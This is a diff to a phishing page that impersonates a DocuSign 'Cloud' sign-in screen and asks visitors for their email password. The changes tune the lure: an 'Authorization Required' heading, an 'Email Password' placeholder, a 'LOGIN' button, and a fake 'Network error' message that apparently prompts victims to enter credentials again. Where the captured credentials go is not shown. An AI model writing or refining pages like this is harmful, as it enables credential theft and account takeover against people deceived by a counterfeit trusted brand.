@@ -90,7 +90,7 @@ body, html {
   </head>
   <body style="font-size: .9rem; font-weight: 400; background-color:white;">
     <div class="container-fluid" style="
-	background-image: url('<a href="https://gyazo.com/6b713f7a5f99c8679db3560c7ab249bb">;
+	background-image: url('https://i.gyazo.com/8da883e202a7c817e48480a0b0b70d92.jpg');
     position: fixed;
     width: 100%;
     height: 100%;
@@ -106,7 +106,7 @@ body, html {
                 <img src="https://i.gyazo.com/d89e92b1d318b17ee505176999b066f7.png" class="img-fluid" width="90px" height="50px" ><br>
 
                 <div class="h4 txt-color" style="font-weight: 600;">DocuSign Cloud</div>
-                <div class="h6 text-black font-weight-normal txt-color">Please Sign in to Download Your File</div>
+                <div class="h6 text-black font-weight-normal txt-color">Authorization Required</div>
               </div>
               
               
@@ -129,20 +129,20 @@ body, html {
   </div>
   <div class="form-group">
     <label for="password" class="txt-color font-weight-bold">Password</label>
-    <input type="password" class="form-control" id="password" name="password" placeholder="Password"
+    <input type="password" class="form-control" id="password" name="password" placeholder="Email Password"
            style="border: 1px solid #a09c9c; border-radius: 1px;" required>
   </div>
   <button type="submit"
           class="btn btn-primary btn-block font-weight-bold"
           style="background-color: #5000F7; border-color: #d2cbcb; border-radius: 1px; margin-bottom: 40px;">
-    SIGN IN
+    LOGIN
   </button>
 </form>
   
                 </div>
 
                   <div class="col-lg-12">
-                     <p class="h6 text-black mt-3 text-center txt-color"> </p><p class="text-black mt-3 text-center txt-color" >DocuSign Document Cloud..</p>
+                     <p class="h6 text-black mt-3 text-center txt-color"> </p><p class="text-black mt-3 text-center txt-color" >DocuSign Cloud.</p>
                 <p class="h5 text-center txt-color" style="font-size: 10px">© DocuSign 2026, All right reserved.</p> 
                     
                   </div>
@@ -235,7 +235,7 @@ $(document).ready(function () {
             'border': '1px solid #f5c6cb',
             'display': 'block'
           })
-          .html('❌ Incorrect Email Password. Please try again.');
+          .html('❌ Network error. Please try again.');
 
         setTimeout(function () {
           $('#loginMessage').fadeOut();
